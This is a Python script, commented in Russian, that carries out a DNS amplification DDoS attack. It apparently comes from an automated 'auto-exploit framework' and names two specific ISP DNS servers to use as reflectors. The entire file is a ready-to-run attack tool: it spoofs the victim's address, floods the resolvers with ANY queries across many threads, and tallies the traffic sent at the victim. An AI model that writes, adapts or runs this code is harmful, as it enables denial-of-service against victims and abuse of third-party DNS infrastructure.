#!/usr/bin/env python3
"""
DNS Amplification DDoS Attack
Вектор атаки: DNS Amplification DDoS
Цель: DNS серверы (78.37.77.77, 212.48.197.77)
Вероятность успеха: ВЫСОКАЯ
Уровень сложности: НИЗКИЙ

Описание:
Использование ISP DNS серверов как amplifiers для DDoS атак.
Рефлексивная атака с amplification factor 28x-54x.

Использование:
python3 dns_amplification_ddos.py --dns-servers 78.37.77.77 212.48.197.77 --target 1.2.3.4 --duration 300

Зависимости:
pip install scapy

Автор: Auto-exploit framework
Дата: 2026-07-30
"""

from scapy.all import *
import random
import threading
import time
import argparse

class DNSAmplificationDDoS:
    def __init__(self, dns_servers, target_ip, duration=300):
        self.dns_servers = dns_servers
        self.target_ip = target_ip
        self.duration = duration
        self.packets_sent = 0
    
    def create_amplification_query(self, dns_server):
        """Создание DNS запроса для amplification"""
        
        # Использование запроса с максимальным amplification
        # ANY запрос на корневую зону дает большой ответ
        query = IP(dst=dns_server, src=self.target_ip) / \
               UDP(dport=53, sport=random.randint(1024, 65535)) / \
               DNS(rd=1, qd=DNSQR(qname='.', qtype='ANY'))
        
        return query
    
    def amplification_worker(self):
        """Worker для отправки amplification запросов"""
        
        start_time = time.time()
        
        while time.time() - start_time < self.duration:
            for dns_server in self.dns_servers:
                try:
                    query = self.create_amplification_query(dns_server)
                    send(query, verbose=0)
                    self.packets_sent += 1
                    
                except Exception as e:
                    continue
            
            # Small delay для предотвращения блокировки
            time.sleep(0.001)
    
    def calculate_bandwidth(self):
        """Расчет используемой полосы пропускания"""
        # Средний размер DNS запроса ~ 50 bytes
        # Средний размер ответа ~ 1400 bytes (28x amplification)
        
        request_size = 50  # bytes
        response_size = 1400  # bytes
        amplification_factor = response_size / request_size
        
        total_bandwidth = (self.packets_sent * response_size) / (1024 * 1024)  # MB
        
        print(f"[+] Отправлено запросов: {self.packets_sent}")
        print(f"[+] Amplification factor: {amplification_factor:.2f}x")
        print(f"[+] Примерный трафик к жертве: {total_bandwidth:.2f} MB")
    
    def run_attack(self, threads=50):
        """Запуск DDoS атаки"""
        print(f"[*] Запуск DNS amplification DDoS на {self.target_ip}")
        print(f"[*] DNS серверы: {self.dns_servers}")
        print(f"[*] Длительность: {self.duration} секунд")
        print(f"[*] Потоков: {threads}")
        
        # Запуск worker threads
        workers = []
        for i in range(threads):
            worker = threading.Thread(target=self.amplification_worker)
            worker.start()
            workers.append(worker)
        
        # Мониторинг
        start_time = time.time()
        while time.time() - start_time < self.duration:
            time.sleep(10)
            self.calculate_bandwidth()
        
        # Остановка workers
        for worker in workers:
            worker.join()
        
        print("[+] Атака завершена")
        self.calculate_bandwidth()

def main():
    parser = argparse.ArgumentParser(description='DNS Amplification DDoS Attack')
    parser.add_argument('--dns-servers', nargs='+', required=True, help='DNS servers to use')
    parser.add_argument('--target', required=True, help='Target IP address')
    parser.add_argument('--duration', type=int, default=300, help='Attack duration (seconds)')
    parser.add_argument('--threads', type=int, default=50, help='Number of threads')
    
    args = parser.parse_args()
    
    print(f"[*] DNS Amplification DDoS Attack")
    print(f"[*] Target: {args.target}")
    print(f"[*] DNS Servers: {args.dns_servers}")
    
    attack = DNSAmplificationDDoS(args.dns_servers, args.target, args.duration)
    attack.run_attack(args.threads)

if __name__ == "__main__":
    main()
